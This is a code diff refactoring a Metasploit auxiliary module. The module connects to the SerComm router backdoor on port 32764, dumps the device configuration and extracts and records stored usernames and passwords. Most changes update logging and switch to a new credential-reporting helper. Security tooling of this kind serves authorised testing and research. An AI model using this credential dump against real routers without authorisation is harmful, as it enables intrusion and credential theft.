@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/auxiliary/report'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
 
@@ -47,8 +45,8 @@ class Metasploit3 < Msf::Auxiliary
       'License'        => MSF_LICENSE,
       'Author'         =>
         [
-          'Eloi Vanderbeken <eloi.vanderbeken[at]gmail.com>', #Initial discovery, poc
-          'Matt "hostess" Andreko <mandreko[at]accuvant.com>' #Msf module
+          'Eloi Vanderbeken <eloi.vanderbeken[at]gmail.com>', # Initial discovery, poc
+          'Matt "hostess" Andreko <mandreko[at]accuvant.com>' # Msf module
         ],
       'References'     =>
         [
@@ -60,11 +58,11 @@ class Metasploit3 < Msf::Auxiliary
       register_options(
         [
           Opt::RPORT(32764),
-        ], self.class)
+        ])
   end
 
   def run
-    print_status("#{peer} - Attempting to connect and check endianess...")
+    print_status("Attempting to connect and check endianess...")
     @endianess = fingerprint_endian
     @credentials = {}
 
@@ -72,20 +70,46 @@ class Metasploit3 < Msf::Auxiliary
       print_error("Failed to check endianess, aborting...")
       return
     end
-    print_good("#{peer} - #{string_endianess} device found...")
+    print_good("#{string_endianess} device found...")
 
-    print_status("#{peer} - Attempting to connect and dump configuration...")
+    print_status("Attempting to connect and dump configuration...")
     config = dump_configuration
 
     if config.nil?
-      print_status("#{peer} - Error retrieving configuration, aborting...")
+      print_status("Error retrieving configuration, aborting...")
       return
     end
 
     loot_file = store_loot("router.config", "text/plain", rhost, config[:data], "#{rhost}router_config.txt", "Router Configurations")
-    print_status("#{peer} - Router configuration dump stored in: #{loot_file}")
+    print_good("Router configuration dump stored in: #{loot_file}")
 
     parse_configuration(config[:data])
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   private
@@ -108,9 +132,6 @@ class Metasploit3 < Msf::Auxiliary
     return nil
   end
 
-  def peer
-    return "#{rhost}:#{rport}"
-  end
 
   def fingerprint_endian
     begin
@@ -152,7 +173,7 @@ class Metasploit3 < Msf::Auxiliary
     disconnect
 
     if res.blank?
-      vprint_error("#{peer} - No answer...")
+      vprint_error("No answer...")
       return
     end
 
@@ -163,18 +184,18 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     unless mark == 0x4d4d6353
-      vprint_error("#{peer} - Incorrect mark when reading response")
+      vprint_error("Incorrect mark when reading response")
       return nil
     end
 
     unless zero == 0
-      vprint_error("#{peer} - Incorrect zero when reading response")
+      vprint_error("Incorrect zero when reading response")
       return nil
     end
 
     unless length == data.length
-      vprint_warning("#{peer} - Inconsistent length / data packet")
-      #return nil
+      vprint_warning("Inconsistent length / data packet")
+      # return nil
     end
 
     return { :length => length, :data => data }
@@ -199,17 +220,15 @@ class Metasploit3 < Msf::Auxiliary
 
     @credentials.each do |k,v|
       next unless v[:user] and v[:password]
-      print_status("#{peer} - #{k}: User: #{v[:user]} Pass: #{v[:password]}")
-      auth = {
-          :host => rhost,
-          :port => rport,
-          :user => v[:user],
-          :pass => v[:password],
-          :type => 'password',
-          :source_type => "exploit",
-          :active => true
-      }
-      report_auth_info(auth)
+      print_good("#{k}: User: #{v[:user]} Pass: #{v[:password]}")
+      report_cred(
+        ip: rhost,
+        port: rport,
+        user: v[:user],
+        password: v[:password],
+        service_name: 'sercomm',
+        proof: v.inspect
+      )
     end
 
   end
@@ -218,7 +237,7 @@ class Metasploit3 < Msf::Auxiliary
     SETTINGS['General'].each do |regex|
       if config.match(regex[1])
         value = $1
-        print_status("#{peer} - #{regex[0]}: #{value}")
+        print_status("#{regex[0]}: #{value}")
       end
     end
   end
@@ -238,5 +257,4 @@ class Metasploit3 < Msf::Auxiliary
 
     end
   end
-
 end
